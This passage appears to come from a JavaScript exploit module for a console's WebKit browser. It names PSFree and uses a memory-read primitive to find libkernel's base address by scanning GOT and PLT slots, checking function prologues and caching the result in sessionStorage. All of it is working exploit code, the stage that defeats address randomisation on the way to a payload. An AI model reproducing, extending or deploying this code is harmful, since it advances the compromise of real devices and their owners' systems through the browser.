        }
        if (c.done) {
            const st = state.pltStats || {};
            return {
                done: true,
                lk: null,
                state,
                phase: "lite-miss",
                refs: st.refs,
                ff25: st.ff25,
                gotHigh: st.gotHigh,
                e8ext: st.e8ext,
                ringProbes: state.ringProbes,
                leakTried: state.leakTried,
                guessTried: c.tried,
            };
        }
        return Object.assign({ state }, c);
    }

    if (state.stage === "got" || state.stage === "rw") {
        const c = scanErrorIatChunk(p, webkitBase, off, state.sub);
        state.sub = c.state;
        if (c.slots != null) state.gotSlots = c.slots;
        if (c.done && c.lk) {
            return Object.assign({ state }, c);
        }
        if (c.done) {
            state.stage = "base";
            state.sub = null;
            return {
                done: false,
                state,
                phase: "base-next",
                prev: c.phase,
                slots: state.gotSlots,
                refs: state.pltRefs,
            };
        }
        return Object.assign({ state }, c);
    }

    if (state.stage === "base") {
        const c = scanLkPrologueChunk(p, off, state.sub, state.anchors);
        state.sub = c.state;
        if (c.done && c.lk) {
            return Object.assign({ state }, c);
        }
        if (c.done) {
            state.stage = "stub";
            state.sub = null;
            return {
                done: false,
                state,
                phase: "stub-next",
                prev: c.phase,
                probes: c.probes,
                slots: state.gotSlots,
                refs: state.pltRefs,
            };
        }
        return Object.assign({ state }, c);
    }

    if (state.stage === "stub") {
        const c = scanLibkernelStubChunk(p, webkitBase, off, state.sub, state.anchors);
        state.sub = c.state;
        if (c.done && c.lk) {
            return Object.assign({ state }, c);
        }
        if (c.done) {
            state.done = true;
            return {
                done: true,
                lk: null,
                state,
                phase: c.phase,
                probes: c.probes,
                slots: state.gotSlots,
                refs: state.pltRefs,
                dynTried: state.dynTried,
                dynSlots: state.dynSlots,
            };
        }
        return Object.assign({ state }, c);
    }

    return { done: true, lk: null, state };
}

export function resolveLibkernel(p, webkitBase, off, opts) {
    opts = opts || {};
    const log = opts.log || (() => {});

    if (!off)
        return { ok: false, error: "missing offsets" };

    try {
        const rawLk = sessionStorage.getItem(SS_LK_BASE);
        if (rawLk) {
            const lk = parseAddrSync(rawLk);
            if (lk && isLibkernelPrologue(p, lk)) {
                log("LK-CACHE", "libkernel " + lk);
                return { ok: true, lk, source: "cache" };
            }
            log("LK-CACHE-BAD", "stale " + rawLk + " — cleared");
            sessionStorage.removeItem(SS_LK_BASE);
        }
    } catch (_) { }

    const savedIat = loadSessionIatRva();
    if (savedIat != null && rvaAllowed(savedIat, off)) {
        const hit = safeVerifyGotSlot(p, webkitBase, off, savedIat);
        if (hit) {
            saveLibkernelSession(hit.lk, hit.iatRva);
            log("LK-IAT", "+0x" + hit.iatRva.toString(16) + " → " + hit.lk);
            return { ok: true, lk: hit.lk, iatRva: hit.iatRva, source: "session" };
        }
    }

    const dyn = resolveLibkernelDynamic(p, webkitBase, off, opts);
    if (dyn.ok)
        return dyn;

    const psf = resolveLibkernelPsfree(p, webkitBase, off, opts);
    if (psf.ok)
        return psf;

    log("LK-BLOCK", "dyn+PSFree miss — Scan libkernel for ELF hunt");
    return { ok: false, error: "Scan libkernel (dynamic GOT + ELF hunt)" };
}

/** Validate user-pasted libkernel base (1 read). */
export function verifyManualLibkernel(p, lk) {
    if (!lk || !isLibkernelPrologue(p, lk))
        return { ok: false, error: "not libkernel prologue (want 0xb8 @ base)" };
    saveLibkernelSession(lk, null);
    return { ok: true, lk };
}

export function elfGotPltRva() {
    return null;
}

export function scanGotPltSlots() {
    return null;
}

export function resolveLibkernelFast() {
    return { ok: false, error: "use RW GOT scan" };
}
